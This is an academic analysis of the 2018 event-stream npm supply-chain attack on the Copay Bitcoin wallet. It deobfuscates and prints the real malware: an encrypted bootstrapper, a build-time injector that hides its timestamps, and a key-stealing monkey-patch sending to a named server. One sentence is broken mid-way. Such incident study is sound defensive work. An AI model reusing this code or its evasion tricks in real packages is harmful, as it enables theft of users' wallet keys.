# Introduction

In today's software development world, developers encapsulate and share
reusable functionality through the use of software
*dependencies*---often called modules, libraries, packages, or imports.
Software dependencies offer several benefits: they offer additional
functionality that a developer might want to invoke from within their
program, without them having to implement that functionality. The use of
modern dependency (or package) managers has simplified sharing and
dealing with third-party dependencies. Package managers automate the
downloading and installation of software dependencies. This automation
has resulted in an explosion of third-party dependency use and re-use,
to the point where public language ecosystems experience exponential
growth. And as dependencies have themselves dependencies---often called
transitive or recursive dependencies---the resulting numbers of
dependencies included in modern software is concerning: modern
applications feature hundreds or thousands of dependencies, to the point
where the vast majority of the code comprising a modern application is
not written by its nominal
developers.

**Supply-chain attacks** This trend has profound security implications
and has given rise to *supply-chain attacks* employed increasingly by
malicious adversaries. Rather than directly targeting a victim software,
these attacks target a victim's software supplier to which the
adversaries have direct access. Long supply chains translate to a
disproportionately attack surface which is also easier to study and
manipulate, as dependencies and their acquisition channels are not
protected at the same degree as the software component that depend on
them. Open source software is the most prominent target for supply-chain
attacks, due to the large amount of reused open source components and
the limited engineering resources available to most organizations
building on these open source components.

In the case of open-source software, attackers can exploit
vulnerabilities that are widely known---for example, by browsing the bug
repository of a software project. Increasingly, however, adversaries
purposefully insert vulnerabilities they later exploit---at times, years
after the software dependency is formed. This gives adversaries
significant control over the nature and specifics of the attack, which
if hidden well can be lurking in the dependency chain for years and
affect a very large number of projects.

**Event-stream incident** In 2018, such a supply-chain attack involved a
library called `event-stream` and meant to simplify working with
data-streams. At the time of the incident `event-stream` was used
by thousands of applications and averaged about two million downloads
per week. The attack was highly targeted, focusing on stealing the
wallet credentials of users with wallets of certain amount of Bitcoin or
Bitcoin cash. The attack succeeded, directly affecting several users,
and caused a significant outcry in both the JavaScript and
crypto-currency communities. In this work, we report the
results of a thorough independent analysis on the `event-stream`
incident. As the incident is symptomatic of much deeper, more insidious
problems across the entire ecosystem, a broader incident analysis
highlights several factors that need to be addressed in order to prevent
further accidents of a similar kind in the future.

# Overview and History of the event-stream Incident {#sec3}

Module `event-stream` is an npm package that
makes creating and working with streams easy. Its creator is GitHub user
@[dominictarr](https://github.com/dominictarr), an experienced developer
and author of more than 450 npm packages. Module `event-stream` is
one of his more popular npm packages as it averages more than 1.500.000
downloads per week. More than 1500 packages are dependent on
`event-stream`. This section of the paper is structured as follows:
It starts with an attack
overview (§[2.1](#attack-overview)) and then proceeds with a timeline of the
events (§[2.2](#timeline)).

## Attack Overview

Sometime around early to mid September of 2018, \@right9ctrl [^1]
offered to take over maintenance duties on the `event-stream`
package. Package `event-stream` maintainer
@[dominictarr](https://github.com/dominictarr) accepted, making
\@right9ctrl the maintainer of the package. Then, \@right9ctrl
introduced flatmap functionality by adding the
`flatmap-stream` dependency to
`event-stream`. The `flatmap-stream` package supports a
flatmap function in addition to the regular `map` already supported
by `event-stream`. User \@right9ctrl did not specify an exact
version of `flatmap-stream`, but rather a range
of possible versions, with `^0.1.0`. Shortly after,
`flatmap-stream` version 0.1.1, was released and was within the
specified version range. This new module included obfuscated malicious
code in its minified [^2] version. Module `event-stream` version
3.3.6 hosted this malicious code due to the `flatmap-stream`
dependency. Third party packages that depended on `event-stream`
version 3.3.6, would now receive the infected `event-stream`
release. This is how the malicious code reached its target,
Copay.

Copay is an open-source Bitcoin wallet platform. The attack succeeded as
the malicious code reached Copay on versions 5.0.2 to 5.1.0 (inclusive).
The injected code did the following on
end-user's devices: (1) it checked the account balance of the victim's
Copay account. (2) If the current balance exceeded 100 Bitcoin or 1000
Bitcoin Cash, the malicious code would (3) steal the victim's account
data and theirs Copay private keys and (4) send them to a web-server
based in Malaysia.

The malicious code was broken down in three payloads: *payload A*
(bootstrap), *payload B* (injector) and *payload C* (harvester). Payload
A had minified code as it referred to an auxilary data file that had 10
lines containing strings in hexadecimal format. Payload A pulled in
these strings, converted from hexadecimal to text strings and replaced
them on its source to form the final version of the code. That way it
was exceedingly difficult for anyone viewing the minified code to
understand its function. Among the hex data in the file, there were two
large encrypted strings, which corresponded to binary data. Those
strings turned out to be payloads B and C, respectively. Payload A then
looked for the decryption key in the dependant package's description.
This allowed it to target Copay exclusively. If the key was found,
payload A would create a new module with payload B as its source and
payload C as its export.

In the following sections,
we will analyze each step of the attack process.

## Attack Timeline

**Overtaking Maintenance:** On July 31, 2015, GitHub user
@[devinus](https://github.com/devinus), commented on an issue [@is1]
against the `event-stream` GitHub repository, questioning whether
flatmap functionality would be welcomed, to which the package
maintainer, @[dominictarr](https://github.com/dominictarr), replied
positively. This information was presumably later discovered by
malicious user \@right9ctrl. That user, approached
@[dominictarr](https://github.com/dominictarr), between August 5 and
September 4 of 2018. User \@right9ctrl offered assistance to the package
maintenance and proposed to make the necessary changes to introduce
flatmap functionality. This introduction would be achieved by adding the
`flatmap-stream` package as a new dependency. User
@[dominictarr](https://github.com/dominictarr) accepted this offer,
making \@right9ctrl a contributor to the `event-stream` Github
repository and giving them full publishing rights for the module on the
NPM ecosystem. In order to publish on the NPM ecosystem you need to be
given publishing rights by the package maintainer.

**Benign Commits Phase:** Soon after, \@right9ctrl pushed a series of
benign commits to the `event-stream` GitHub repository, potentially
to gain @[dominictarr](https://github.com/dominictarr) trust. Here is a
list of those commits:

-   [b550f5](https://github.com/dominictarr/event-stream/commit/a74c9b2ab433c4e36089fbb72931f6b786b550f5):
    Upgrade dependencies

-   [37c105](https://github.com/dominictarr/event-stream/commit/0cc6c7f6c762ef7a8c288296d537d4255337c105):
    Add map and split examples

-   [477832](https://github.com/dominictarr/event-stream/commit/ee8f8e4e9297890fdf3cb66584589eb493477832):
    Remove trailing space in split example

-   [2c2095](https://github.com/dominictarr/event-stream/commit/c08d14b777aa48524948c6d0de024096bf2c2095):
    Add better pretty.js example

-   [a644c5](https://github.com/dominictarr/event-stream/commit/05b0224c058a721ed293b1fc2ac3c0c608a644c5):
    Update Readme

-   [31ab0e](https://github.com/dominictarr/event-stream/commit/918d4a3398166d6f4264f7fc4ec2cc43f731ab0e):
    Release version 3.3.5

**Introducing flatmap-stream:** On September 9, 2018 the following
commit was pushed to the `event-stream` GitHub repository by user
\@right9ctrl:

-   [2b8285](https://github.com/dominictarr/event-stream/commit/e3163361fed01384c986b9b4c18feb1fc42b8285):
    (Add flatmap dependency)

This commit introduces `flatmap-stream` as a dependency to
`event-stream`. Note that on line 12 of `package.json`, a caret is
used to specify the version of `flatmap-stream`. In the context of
npm's dependency handling, the caret '`^`' means 'Compatible with
version' and is commonly used in semantic versioning [@versioning]. For
example `^2.3.4` will use versions up to *3.0.0*.

**Some final changes to event-stream:** These are the commits pushed
after the introduction of `flatmap-stream`:

-   [8bdfe2](https://github.com/dominictarr/event-stream/commit/5999958dfc1b0a80e6caeac4cdc76b3b828bdfe2):
    Release version 3.3.6

-   [935cd1](https://github.com/dominictarr/event-stream/commit/908fee5c65d4eb02809a84a1ebc3e5df1f935cd1):
    Remove flatmap dependency

-   [145601](https://github.com/dominictarr/event-stream/commit/2bd63d58fe24367372690c29c7249ed1c7145601):
    Update package.json

-   [c98f7d](https://github.com/dominictarr/event-stream/commit/8bc742ba91aca6c5f5b9467d8d7653c95ec98f7d):
    Release version 4.0.0

-   [d3b9c9](https://github.com/dominictarr/event-stream/commit/60d0aa3def10c09ead68ee43804f244ffbd3b9c9):
    Add search keywords

On October 5, 2018 `flatmap-stream` version 0.1.1 included the
malicious attack in its minified source code. Version 3.3.5 of
`event-stream` had been stable for a long time and as a result a
lot of projects depended on it.

A large number of software projects depended on the version
`"^3.3.5"` of `event-stream` and since they used the caret,
would now get automatically updated to `event-stream` 3.3.6. As was
mentioned earlier, `event-stream` 3.3.6 pulls in a fresh
`flatmap-stream` 0.1.1 with the malicious code included due to its
`"^0.1.0"` `flatmap-stream` dependency.

**Detection of the attack:** On October 29, 2018
@[jaydenseric](https://github.com/jaydenseric) opened an issue on
the [nodemon](https://github.com/remy/nodemon/) repository reporting an
unexpected deprecation warning. This warning was caused by the
deprecated method `createDecipher`, used in the malicious code.
User @[FallingSnow](https://github.com/FallingSnow) suspects it is an
injection attack and opens an issue against `event-stream`
on November 20, 2018. Shortly afterwards, on November 26, 2018 the
`flatmap-stream` package got removed from npm.

# Analysis of the attack

This section of the paper analyzes the three payloads of the attack.

## Payload A 

Payload A acts as the bootstrapper for the rest of the Payloads and was
appended to the `flatmap-stream` codebase in version 0.1.1. The
payload consists of the following code:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
! function() {
 try {
  var r = require,
   t = process;
  function e(r) {
   return Buffer.from(r, "hex").toString()
  }
  var n = r(e("2e2f746573742f64617461")),
   o = t[e(n[3])][e(n[4])];
  if (!o) return;
  var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
   a = u.update(n[0], e(n[8]), e(n[9]));
  a += u.final(e(n[9]));
  var f = new module.constructor;
  f.paths = module.paths, f[e(n[7])](a, ""),
   f.exports(n[1])
 } catch (r) {}
}();
```

This code is unreadable, as it is still obfuscated. Let us walk through
it line by line, deobfuscating and analyzing it. Function `e`
converts a hexadecimal string to text. It is first used in line 8:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
var n = r(e("2e2f746573742f64617461"));
```

The hexadecimal string is equivalent to `./test/data`{.js}, and function
`r`{.js} is the function `require`{.js}. So, after renaming `n`{.js} to
`testData`{.js}, line 8 becomes as follows:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
var testData = require("./test/data");
```

This line `imports` an auxiliary data file. This data file contains
10 hexadecimal string literals. Next to them you can see their string
representation. Multiple of these strings are related to cryptography
and would raise suspicion should anyone see them in a module such as
`flatmap-stream`. Here are the contents of the data file:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
module.exports = [
 "75d4c...629", // Payload B
 "db673...6e1", // Payload C
 "63727970746f", // crypto
 "656e76", // env
 "6e706d...f6e", // npm_package_description
 "616573323536", // aes256
 "63726...6572", // createDecipher
 "5f636f6d70696c65", // _compile
 "686578", // hex
 "75746638" // utf8
]; 
```

Line 9 extracts the fourth and fifth string from the data file. Variable
`o` has been renamed to `desc` for readability:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\small"}
var desc = process.env.npm_package_description;
```

This line fetches the description of the package from the `node.JS`
environment. The `if` statement on line 10 ensures that the
description is not blank.

From line 11 up to line 15 we repeat the process of getting a line from
the auxiliary data file and converting it to string. We do that in order
to deobfuscate the rest of the function. Moreover, we rename variable
`u` to `decipher`, `a` to `text`, and `f` to
`newModule`. By doing so, we get:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
var decipher = require("crypto").
createDecipher("aes256", desc);
var text = decipher.update(testData[0], "hex", "utf8");
text += decipher.final("utf8");
var newModule = new module.constructor();
newModule.paths = module.paths;
newModule._compile(text, "");
newModule.exports(testData[1]);
```

These lines of code perform the following actions:

1.  Using the package description fetched previously, it creates a
    `decipher` instance.

2.  It uses the `decipher` instance to decrypt the first line
    (which consists of binary data) from the file.

3.  A new module is created with the decrypted data from the file as its
    source, and the second line from the file is exported from that
    module.

Since the description of a specific npm package is used as the
decryption key, payloads B and C are decrypted correctly only when
`flatmap-stream` is part of the dependency tree through
`event-stream`. Hence, the scope of the attack is limited to Copay,
which also helps minimize detection risk.

A common theme among all three payloads, is the presence of
`try-catch` statements. These ensure that if any part of malicious
code fails, the attack would fail silently, raising no suspicion.

## Payload B

After successful decryption of the first line of the data file from
payload A, payload B is created as a new module. Payload B acts as the
injector. This new unobfuscated module looks as follows:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
/*@@*/
module.exports = function(e) {
 try {
  if (!/build\:.*\-release/.test(process.argv[2]))
   return;
  var t = process.env.npm_package_description,
   r = require("fs"),
   i = "/path/ReedSolomonDecoder.js",
   n = r.statSync(i),
   c = r.readFileSync(i, "utf8"),
   o = require("crypto").createDecipher("aes256", t),
   s = o.update(e, "hex", "utf8");
  s = "\n" + (s += o.final("utf8"));
  var a = c.indexOf("\n/*@@*/");
  0 <= a && (c = c.substr(0, a)),
   r.writeFileSync(i, c + s, "utf8"),
   r.utimesSync(i, n.atime, n.mtime),
   process.on("exit", function() {
    try {
     r.writeFileSync(i, c, "utf8"),
      r.utimesSync(i, n.atime, n.mtime)
    } catch (e) {}
   })
 } catch (e) {}
};
```

We start with line 4:

``` {.js fontsize="\\normalsize"}
if (!/build\:.*\-release/.test(process.argv[2])) 
 return;
```

The script is executed by a command in this format:

``` {.shell fontsize="\\small"}
npm run-script script-name
```

The regex from line 4 tests if `script-name` starts with
`'build:'` and ends with `'-release'`. The regex was designed
to test for scripts that target the Android, iOS, and desktop versions
of Copay as opposed to internal test builds for Copay's developers.

The Copay application has another non-malicious dependency called
`ZXing`, which is a barcode processing library. This module imports
`ReedSolomonDecoder.js`, which is being targeted by payload B for
the injection. In particular, the code of payload C will be injected
into the `ReedSolomonDecoder.js` file by modifying the file on
disk. However, this file is loaded in the context that the malicious
script is intended to be run in. If the file has not been modified,
payload B does nothing. If it does, `'/*@@*/'` appears in the file
and payload C is injected into the file, awaiting execution. 
After the injection occurs, payload B
replaces the metadata of the file (modified/accessed timestamps) so that
it appears like the file has not been altered.

Payload B demonstrates profound knowledge of Copay's internal workings
by the attackers, as they were aware of Copay's build scripts, as well
as the package's use of the `ReedSolomonDecoder.js` file.

## Payload C 

Payload C acts as the harvester, and is executed when Copay loads
`ReedSolomonDecoder.js`. It consists of several functions working
together, including the auxiliary `prepRequest`,
`sendRequest`, and `getFromStorage` functions. The common
theme across all the functions of this Payload, is that they reproduce
the original behaviour as to suggest that no suspicious activity is
taking place at all.

Function `prepRequest` prepares a payload [^3] to be sent by
function `sendRequest`. The payload gets encrypted using the public
key provided by the attacker. Function `sendRequest` takes as
arguments an IP address, a path, and a payload. It then sends the
payload as a string to the host inputted on the specified path. Then,
the payload is sent to `copayapi.host` and
`111.90.151.134`---a web-server based in Kuala Lumpur, Malaysia.
Function `getFromStorage` stores the contents of a file in a
variable and then parses it to a callback function. It does so by first
detecting the current environment: Mobile, Cordova or Electron.

The order of execution is as follows:

1.  Using `getFromStorage`, the user's credentials are retrieved
    and passed to a callback function

2.  The callback function ensures that it is being run on the live
    Bitcoin network, labeled `livenet`.

3.  The callback functions checks the balance of the user; if it exceeds
    100 BTC or 1000 BCH it marks the account using a global variable.

4.  The account credentials are finally sent using the
    `prepRequest` and `sendRequest` functions, regardless of
    the account balance.

The injected code proceeds with the following process:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
var Cred = require("wallet-client/lib/credentials.js");
Cred.prototype.getKeysFunc = e.prototype.getKeys;
Cred.prototype.getKeys = function(e) {
 var t = this.getKeysFunc(e);
 try {
  if (global.CSSMap &&
   global.CSSMap[this.xPubKey]) {
   delete global.CSSMap[this.xPubKey];
   prepRequest("p", e + "\t" + this.xPubKey))
  }
 } catch (e) {}
 return t
}
```

This last section of code intercepts and monkey-patches the
`getKeys`{.js} function from the `Credentials` class. 
Monkey-patching refers to dynamically
altering an object's method during the execution of a program. The
patched version of the function reproduces the functions original result
but it also checks the global variable used previously by the callback
function to flag each key. If the value comes up positive, meaning the
account balance requirements are met, it deletes the variable to remove
any remaining traces and transmits the user's Copay private keys using
the `prepRequest` function. The script is launched as soon as the
user's device is ready, using the following code segment:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
window.cordova ? 
 document.addEventListener("deviceready", 
  runPayload) : runPayload()
```

# Discussion of Potential Defences 

This section explores technical and non-technical approaches focusing on
the detection of and defense against software supply-chain threats. As
the `event-stream` incident poses an impactful real-world
supply-chain attack, it is worth studying how common defenses would fare
against it.

Program analysis, transformation, and synthesis techniques stand out as
key levers for detecting and mitigating supply-chain threats. Among
other approaches, these techniques have been used to (1) sandbox
untrusted software dependencies, isolating them from the rest of the
application and the broader environment, (2) eliminate or de-bloat
unused functionality, reducing the program surface available for
adversarial subversion, (3) extract key invariants about the execution
of these dependencies, highlighting potential behaviors a dependency can
or cannot have, (4) prove key properties about a software component,
often generating machine-checkable specifications about its behavior,
(5) learn and regenerate the core functionality of a dependency,
effectively eliminating malicious dependencies from the supply chain.
Other approaches employed today include dependency pinning, manual
vetting, and automated checks for known vulnerabilities.

**Static program analysis** Static program
analysis is a technique for
understanding program or program-fragment behavior by examining its
source or object code. It typically parses and lifts the code into an
intermediate representation that is more amenable to analysis and
transformation. As it focuses on code written in a single encoding,
static analysis is typically geared towards (and built around) a
specific programming language---and thus a single analysis tool cannot
apply analysis and maintain information across language boundaries.

In the case of the `event-stream` incident, static analysis could
trivially operate on the minified version of the code (*i.e.*, `r`
instead of `require` *etc.*). However, as the `event-stream`
attack used a series of phases many of which employed encrypted payloads
(*i.e.*, large strings in hexadecimal encoding), it is unlikely that
static program analysis alone would have been able to detect the attack.
Additionally, static analysis is typically run on the development
version of a library---but the malicious `event-stream` was offered
only on the `npm` registry rather than its GitHub repository.

**Dynamic program analysis** Dynamic program
analysis is a
long-standing technique for monitoring, understanding, and potentially
intervening in program behavior during its execution. Since dynamic
analysis tracks an execution of the program, it depends on certain test
inputs to understand common program behavior. It also incurs a runtime
overhead that slows down the execution of the program and is therefore
usually not employed on production environments.

As the `event-stream` attack activated very selectively---among
other environment requirements, only on production environments and only
on the live Bitcoin network---it is highly unlikely that dynamic
analysis alone would have detected the `event-stream` attack. It is
more likely that dynamic program analysis would be useful in extracting
invariants about the benign `event-stream` behavior---*e.g.*, the
permissions exercised during the normal execution of the
`event-stream` library---which could then be used as a ground-truth
information in cases of divergence. Since dynamic analysis is not
typically employed in production environments, it is unclear how such
ground-truth invariants could be of significant aid when
`event-stream` diverges.

**Runtime component protection** Runtime component protection
techniques provide
monitoring, instrumentation, and policy enforcement during program
execution. Typically these techniques are applied at the system level
across the entire program---*e.g.*, via containerization and kernel
jails---and more rarely through sandboxing, wrapping, or transformation
of individual libraries.

It is unclear whether system-level application sandboxing would have
helped in the `event-stream` incident. From the perspective of the
operating system or runtime environment there is no distinction between
program components, and thus it is not clear why a certain call to Even
with file-system virtualization, the malicious `event-stream` would
have updated the local version of the Reed--Solomon decoder which would
then been used inadvertently from the (benign) ZXing library. Tight
library-level sandboxing could have likely worked, as there was no
reason for the purely functional computation implemented by
`flatmap-stream` to access the file system.

**Functionality elimination & code debloating** Functionality
elimination  and, more recently, code
debloating 
attempt to minimize the attack surface of a program by completely
eliminating functionality altogether. Rather than locking what
functionality a piece of code can access at runtime, these techniques
attempt to eliminate code that is unused during program execution. Using
automated analyses, these techniques need to hit a spot between
soundness and completeness similar to automated program analysis and
library sandboxing techniques mentioned earlier. As a result, they use
static analysis, dynamic analysis, or a combination thereof to identify
unused or unreachable program regions.

In the case of the `event-stream` incident, it is possible that
these techniques would have eliminated the malicious code. Since the
attack activated highly selectively, code debloating techniques would
likely not have witnessed the execution paths taken by the malicious
code---including writing to an external file, changing metadata, and
overriding key functionality.

**Active library learning & regeneration** Given a potentially
compromised software component, active-learning and regeneration
techniques explore the behavior of the component in a controlled
environment to learn a model of its functional
behavior. These techniques choose inputs, feed these
inputs to the component, and observe the resulting outputs to infer a
model of the client-observable functionality that the component
implements. This model excludes behavior characteristic of inserted
vulnerabilities, as these are not typically exercised if the component
is executed in an environment other than the one targeted by the attack.
The active learning and regeneration techniques then use the inferred
model to regenerate a new version of the component---discarding any
vulnerabilities or added computations.

Active learning and regeneration would have likely worked against the
malicious version of `event-stream` module, which along with the
malicious computation it implemented complete and unmodified the core
computation that the original `event-stream` library implemented.
The client code interacting with component observes only the functional
behavior of the component, *i.e.*, the results that it returns to the
client when invoked, and not any malicious side effects, additional
computation, or external communication that the component may perform
when it executes.

**Ecosystem approaches** Language ecosystem tooling such as package and
dependency managers today offer a variety of functionality aiding
developers in checking or operating their dependency chains. Typical
functionality offered by such toolchains today including checking for
known vulnerabilities in a program's dependency chain or pinning
(freezing) its dependencies to a specific
version.

Checking the dependency tree for known vulnerabilities would have not
helped, as the `event-stream` was a malicious zero-day attack
purposefully and stealthily inserted to the `event-stream` library.
Dependency pinning could have delayed the deployment of the
`event-stream` in production environments, but would have likely
not stopped the attack---Copay developers could have updated their
dependencies to the latest version manually. Additionally, these
approaches may cause users to forego valuable bug and vulnerability
fixes that come with newer versions of a library.

# Conclusion

Software is not only used at an unprecedented scale; it is *re-used* at
an unprecedented scale---from the smallest cryptographic primitives to
simple padding routines to shared system libraries. This trend is only
accelerating due to the unprecedented economic cost and scale of modern
software---which is inherently not amenable to mass production.
Supply-chain attacks are thus quickly becoming the primary attack vector
employed by malicious adversaries.

The `event-stream` incident---targeting a package used by hundreds
of applications and averaged about two million downloads per
week---serves as a prime example of this technique. The vulnerability,
introduced by a new maintainer, included code designed to harvest
account details from select Bitcoin wallets when executing as part of
the Copay wallet. A series steps allowed the attacker to take control of
important account functions, while the attack was designed to activate
only on select few environments---only when part of a specific
dependency tree, only on specific wallets, and only on the live Bitcoin
network.

An important first step for countering such attacks is to raise
awareness: developers need to be aware of the trade-offs involved in
using third-party dependencies and take active steps in protecting their
software against such threats; governments and non-technical
stakeholders need to understand that software is no longer written by a
single party; and security researchers need to explore techniques for
detecting and defending against supply-chain attacks with minimal
developer effort. Conventional program analysis techniques would have
likely missed the attack, and manual vetting proved to be inadequate for
the scale and complexity of dependencies used in modern applications.

[^1]: User's \@right9ctrl GitHub account is now deleted.

[^2]: Minification is the process of removing comments, non-essential
    whitespace, and replacing long identifiers from source code to
    reduce its size. This process is usually automated and is done to
    improve website performance.

[^3]: Not to be confused with the malicious code payloads
